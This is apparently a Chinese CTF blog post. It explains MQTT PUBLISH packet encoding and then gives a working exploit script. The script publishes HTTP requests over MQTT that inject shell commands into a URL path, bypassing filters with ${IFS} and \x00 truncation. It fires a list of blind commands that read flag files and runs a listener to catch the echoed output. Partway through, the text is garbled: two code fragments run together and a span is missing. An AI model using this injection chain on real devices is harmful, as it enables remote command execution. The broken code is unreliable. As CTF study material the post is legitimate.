---
title: "MQTT PUBLISH 数据包解析"
date: 2025-07-10
categories:
  - 二进制安全
  - 协议
tags:
  - pwn
  - MQTT
  - IoT
---

它分为三个部分：

1. **固定报头 (Fixed Header)：** 包含报文类型（PUBLISH）和整个数据包剩余部分的长度。
2. **可变报头 (Variable Header)：** 对于 PUBLISH 报文，这里主要存的是 Topic（主题名）。
3. **有效载荷 (Payload)：** 就是我们真正想发送的消息内容（即带有漏洞利用代码的字符串）。

### `pack_str(s)`：MQTT 的字符串打包器
在 C 语言中，字符串以 `\x00` 结尾。但在网络传输（特别是 MQTT 协议）中，为了防止数据截断，字符串采用的是长度前缀机制。也就是说，你要发一个字符串，必须先用 2 个字节告诉对方这个字符串有多长。

```python
def pack_str(s):
    # !H 代表 2 字节的大端序长度，强制加在字符串前面
    return struct.pack("!H", len(s)) + s
```

+ `**struct.pack("!H", len(s))**`** 是什么**
    - `!` 代表**大端序（网络字节序）**，这是网络协议通信的通用标准（高位字节在前，低位字节在后）。
    - `H` 代表无符号短整型（Unsigned Short），刚好占用 **2 个字节**，最大可以表示 65535 的长度。
+ **举个例子：** 如果你要发送 Topic 名 `"HTTP"`（长度为 4）。 `len("HTTP")` 是 4。打包后，前面会生成两个字节 `\x00\x04`。 最终返回的字节流就是：`b'\x00\x04HTTP'`。服务端收到后，先读两字节发现是 4，接着往后读 4 个字节，就精准拿到了 "HTTP"。

### `enc_varint(x)`：变长编码（最精妙的设计）
这是 MQTT 协议为了省流量搞出来的一个特殊算法，用来表示剩余长度。 如果数据包很小，剩余长度用 1 个字节就够了；如果很大，可能需要 2 到 4 个字节。MQTT 是怎么知道这个长度到底占用了几个字节呢？

它巧妙地利用了每个字节的**最高位（第 8 位）作为延续位**：

+ 如果最高位是 `1`，说明“还没完，下一个字节也是长度的一部分”。
+ 如果最高位是 `0`，说明“这就是长度字段的最后一个字节了”。 剩下的 7 位才用来存储真正的数值数据（即 Base-128 编码）。

```python
def enc_varint(x):
    out = b""
    while True:
        b = x % 128       # 取出低 7 位的值 (因为 128 是 2 的 7 次方)
        x //= 128         # 把原数右移 7 位，准备处理下一批数据
        if x > 0:
            b |= 0x80     # 如果 x 还没处理完，把 b 的最高位设为 1 (0x80 即二进制 10000000)
        out += bytes([b]) # 把算好的这个字节加到结果里
        if x == 0:        # 处理完了，返回！
            return out
```

+ **举个例子：** 假设我们要发送的剩余内容长度是 `130` 个字节。
    - **第一轮循环：**
        * `b = 130 % 128 = 2`。
        * `x = 130 // 128 = 1`。
        * 因为 `x > 0`，所以 `b |= 0x80`，`b` 变成了 `2 | 128 = 130`（十六进制 `0x82`）。
        * `out` 记录下 `\x82`（最高位是 1，意思是：别急，后面还有）。
    - **第二轮循环：**
        * `b = 1 % 128 = 1`。
        * `x = 1 // 128 = 0`。
        * 因为 `x == 0`，不需要打标记了，`b` 依然是 1（十六进制 `0x01`）。
        * `out` 加上 `\x01`（最高位是 0，意思是：长度读完了！）。
    - 最终返回 `b'\x82\x01'`。服务端靠这两个字节就能反解出真实的长度 130。

### `publish` 和 `send_pkt`：终极拼装与发射
有了前面两个零件，现在可以组装真正的 MQTT 报文并发送了。

```python
def publish(self, topic, payload, qos=0):
    # 1. 组装后面一大坨 (可变报头 + 有效载荷)
    body = pack_str(topic) + payload 

    # 2. 构造固定报头的第 1 个字节
    hdr = 0x30 | (qos  0: b |= 0x80
            out += bytes([b])
            if x == 0: return out

    def _pack_str(self, s):
        if isinstance(s, str): s = s.encode()
        return struct.pack("!H", len(s)) + s

    def connect(self, client_id):
        vh = self._pack_str("MQTT") + bytes([4, 2]) + struct.pack("!H", 60)
        self.sock.sendall(bytes([0x10]) + self._enc_varint(len(vh + self._pack_str(client_id))) + vh + self._pack_str(client_id))
        time.sleep(0.1) # 等待连接建立

    def subscribe(self, topic):
        body = struct.pack("!H", 1) + self._pack_str(topic) + bytes([0])
        self.sock.sendall(bytes([0x82]) + self._enc_varint(len(body)) + body)
        time.sleep(0.1)

    def publish(self, topic, payload):
        if isinstance(payload, str): payload = payload.encode()
        body = self._pack_str(topic) + payload
        self.sock.sendall(bytes([0x30]) + self._enc_varint(len(body)) + body)

    def close(self):
        self.running = False
        try: self.sock.close()
        except: pass

# ==========================================
# [ 雷达监听区 ] (后台守护线程，专门抓瞎打的回显)
# ==========================================
def radar_listener(client):
    print("[*] Radar activated. Listening for echoes...")
    while client.running:
        try:
            # 这里做了极简处理，实际可用 socket recv 循环读取
            data = client.sock.recv(4096)
            if not data: continue
            
            # 尝试在乱码的二进制流中提取可见文本
            txt = data.decode('utf-8', 'ignore')
            
            # TODO: 根据题目具体的回显格式(JSON或明文)修改这里的匹配逻辑
            if "httpclient" in txt or "{" in txt:
                print(f"\n[Radar Catch] ==> {txt.strip()}")
            if "flag{" in txt.lower() or "ctf{" in txt.lower():
                print(f"\n[!!!] BINGO! FLAG FOUND: {txt.strip()}\n")
        except:
            break

# ==========================================
# [ 漏洞利用核心区 ] (你需要根据题目修改这里)
# ==========================================
def fire_payload(cmd):
    """
    在这里构造你的特定 Payload。
    支持返回单次请求，或者由多次请求组成的攻击链。
    """
    # 示例：针对 \x00 截断和二次覆盖漏洞的 Payload
    # 使用 ${IFS} 绕过空格限制，使用 \x00 阻断解析
    cmd = cmd if cmd.endswith("${IFS}#") else cmd + "${IFS}#"
    stage1 = f"GET /ctf/index_html;{cmd} HTTP/1.1\r\n\r\n\x00".encode()
    stage2 = b"GET /ctf/index_html HTTP/1.1\r\n\r\n\x00"
    
    # 每次攻击建立一个新的独立客户端
    attacker = RawMQTT(HOST, PORT)
    attacker.connect(f"atk_{random.randint(100,999)}")
    
    # 执行攻击链 (带容错延时)
    attacker.publish(PUB_TOPIC, stage1)
    time.sleep(0.5) 
    attacker.publish(PUB_TOPIC, stage2)
    
    attacker.close()

# ==========================================
# [ 主控循环区 ] (稳健的盲打/爆破引擎)
# ==========================================
def main():
    # 1. 启动接收端雷达
    radar = RawMQTT(HOST, PORT)
    radar.connect(f"radar_{random.randint(100,999)}")
    radar.subscribe(SUB_TOPIC)
    
    t = threading.Thread(target=radar_listener, args=(radar,), daemon=True)
    t.start()
    time.sleep(1) # 给雷达一点启动时间

    # 2. 准备武器库 (根据系统环境定制盲猜命令)
    arsenal = [
        "echo${IFS}PWNED",   # 探针：测连通性
        "ls${IFS}-la",       # 探针：看当前目录
        "cat${IFS}f*",       # 盲狙：f开头文件
        "cat${IFS}flag*",    # 盲狙：flag文件
        "cat${IFS}/flag",    # 盲狙：根目录flag
    ]

    # 3. 循环开火 (带容错机制)
    print(f"[*] Starting attack loop. Total payloads: {len(arsenal)}")
    for cmd in arsenal:
        print(f"[-] Firing: {cmd}")
        try:
            fire_payload(cmd)
            time.sleep(2) # 打完一发，等雷达飞一会儿
        except Exception as e:
            print(f"[!] Target choked on '{cmd}': {e}")
            time.sleep(1) # 容错休眠，防止把服务打挂

    # 4. 打扫战场
    print("[*] Arsenal empty. Waiting 3 seconds for lingering echoes...")
    time.sleep(3)
    radar.close()
    print("[*] Done.")

if __name__ == "__main__":
    main()
```